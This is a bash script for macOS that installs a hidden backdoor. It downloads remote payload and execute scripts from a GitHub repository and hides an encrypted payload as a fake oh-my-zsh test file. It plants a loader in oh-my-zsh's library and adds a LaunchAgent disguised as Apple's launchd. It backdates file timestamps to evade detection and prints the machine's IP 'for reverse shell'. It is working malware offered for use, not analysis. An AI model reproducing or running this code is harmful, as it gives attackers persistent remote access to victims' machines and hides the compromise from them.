#!/bin/bash

os=$(uname)

if [ -z "$USER" ]; then
	echo "No user set."
	exit 1
fi

if [ "$USER" == "jmuhlber" ]; then
	echo "nenene"
	exit 1
fi


macinstall() {
	if [[ -d ~/.oh-my-zsh ]]; then
		curl https://raw.githubusercontent.com/Moewenmann/masterplan/refs/heads/main/source/payload.sh > /tmp/temp
		INFILE="/tmp/temp"
		OUTFILE=$HOME/.oh-my-zsh/lib/tests/lyfs.test.zsh
		openssl enc -aes-256-cbc -salt -in "$INFILE" -out "$OUTFILE" -k "$USER"
		rm -rf /tmp/temp
		curl https://raw.githubusercontent.com/Moewenmann/masterplan/refs/heads/main/source/execute.sh > ~/.oh-my-zsh/lib/host.zsh
		touch -t 202410191633 ~/.oh-my-zsh/lib/host.zsh
		touch -t 202405131058 "$OUTFILE"
		echo "Installed ozsh."
	fi
	curl https://raw.githubusercontent.com/Moewenmann/masterplan/refs/heads/main/source/launchagent.xml > ~/Library/LaunchAgents/com.apple.launchd.plist
	touch -t 202405131058 ~/Library/LaunchAgents/com.apple.launchd.plist
	launchctl unload ~/Library/LaunchAgents/com.apple.launchd.plist 2>/dev/null
	launchctl load ~/Library/LaunchAgents/com.apple.launchd.plist
	launchctl start com.apple.launchd
	echo "Installed la."
	echo "ip for reverse shell:"
	ipconfig getifaddr en0
}

linuxinstall() {
	echo "System not supportet yet."
	exit 1
}


if [[ "$os" == "Linux" ]]; then
	linuxinstall
elif [[ "$os" == "Darwin" ]]; then
	macinstall
else
	echo "System not supportet."
	exit 1
fi
